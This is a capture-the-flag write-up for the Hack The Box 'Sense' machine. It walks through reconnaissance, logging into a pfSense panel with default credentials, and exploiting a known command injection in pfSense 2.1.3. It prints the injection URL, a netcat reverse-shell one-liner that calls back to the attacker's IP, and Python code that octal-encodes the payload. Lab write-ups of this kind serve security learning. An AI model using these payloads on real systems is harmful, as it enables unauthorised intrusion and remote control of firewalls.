# Sense [HTB](https://app.hackthebox.com/machines/111)
![sense-01]()

## Recon 

After adding the target to my `/etc/hosts` file, I fire off an `nmap` scan:

```bash
nmap -sC -sV -A -p- sense.htb -oN nmap.result
```

![nmap-res-02]()

We have the following:

+ A lighthttpd V1.4.35 HTTP server on ports 80 & 443. 

The target runs a single HTTP service with a lighthttpd server. Port 80 immediately redirects us to an SSL connection, let's have a look. 


## HTTP Port 443

I open up my browser and type `https://senhse.htb`, my browser warns me about the validity of the certificate of this site, I accept the risks and ask to load the page anyway:

![site-03]()

The site references [DNS rebinding attacks](https://en.wikipedia.org/wiki/DNS_rebinding). These attacks usually involve a victim user clicking on a link, or a hidden HTML tag that leads to a domain controlled by the attacker's DNS server. 

The DNS rebinding attack leverages  the control the attacker has over the DNS to bypass the [Same-Origin Policy](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjh3dqTu8qBAxVsh_0HHTVpDkAQFnoECBUQAw&url=https%3A%2F%2Fweb.dev%2Fsame-origin-policy%2F&usg=AOvVaw3oH90bDU0AARo5NNkbh5nZ&opi=89978449) imposed by modern web browsers. This is possible because the browser determines the origin of the request based on the `Hostname` parameter and general URI scheme, but because hostnames can point to any arbitrary IP, this can be leveraged to bypass the `Same-Origin Policy` to make malicious requests to other resources on the victim user's behalf.

Some examples of attack vectors can be internal network components in an enterprise enviorement, internal resources on the server itself, other sites altogether, like banking sites, etc. Here is the general scheme of the attack:

![dns-rebind-04]()

Palo Alto has a nice [artical](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwiVt9rOvsqBAxUkhv0HHUP2AQ4QFnoECBAQAQ&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fdns-rebinding%2F&usg=AOvVaw1ZW27d0rhTxtJWKsFNLpUl&opi=89978449) about DNS rebinding attacks if you want to read more about it.


To avoid potential DNS rebinding attacks, the server replied with the above error. Rejecting requests with hostnames would eliminate any potential for DNS rebinding attacks, though it seems rather extreme. 

I dont see much potential in pulling a DNS rebinding attack againts this target. Let's open the web server through an IP address instead:

![login-req-05]()

This is an admin login portal for the [pfSense](https://www.pfsense.org/) open source firewall. At first I tried default credentials, when that failed I tried to brute force the login page. I wrote a simple script in Python to bypass the anti-csrf and session cookies which did work, but I've noticed that I get blocked after about 15 failed attempts. 

So instead, I decided to run a directory and file scan using `ffuf`:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u https://10.129.103.206/FUZZ -e .php,.cgi,.js,.html,.txt,.json,.xml
```

This yields quite a lot of results, but the most interesting one to me is this:

![users-06]()

If we open this file we can see the following:

![file-07]()

This gives us a username. The password is set to be "company default", if we search online for default pfSense credenitlas we will find that the default password for most if not all appliances is `pfsesne`. 

After a few failed login attempts I found that the username is misspelled, and the credentials that do work are `rohit : pfsense`. This gets us inside the pfsense admin panel:

![admin-panel-08]()

We can see that the version is 2.1.3 for a 64-bit FreeBSD machine. Let's search for exploits with:

```bash
searchsploit pfsense 2.1.3
```

![searchsploit-09]()

Command Injection sounds good. After a bit of searching online I found that there is also a metasploit version available, so I decided to review the source code to try and pull this off manually:

![source-10]()

Two things are going on here. First the actual payload is encoded to octal values. Next, the actual exploitation is executed via a Get request to the following URL:

```bash
/status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf%20%27<PAYLOAD>%27|sh|echo
```

We need to request this page after we have logged in to the pfsense admin panel and we have an active session, which we do have. So all we need is a reverse shell payload for a BSD platform, encode it to octal value, and send the GET request. 

The payload I got [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd).

Next, we need to encode it, we can do this with the following python code:

```python
command = """
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.69 443 >/tmp/f
"""

payload = ''
for char in command:
    payload += ('\\' + oct(ord(char)).lstrip('0o'))

print(payload)
``` 

Finally, we need to URL encode the `|` characters found in the URL to `%7c`. All in all my final request to the server looks like this:

![req-11]()

This gets me a shell as root:

![root-12]()

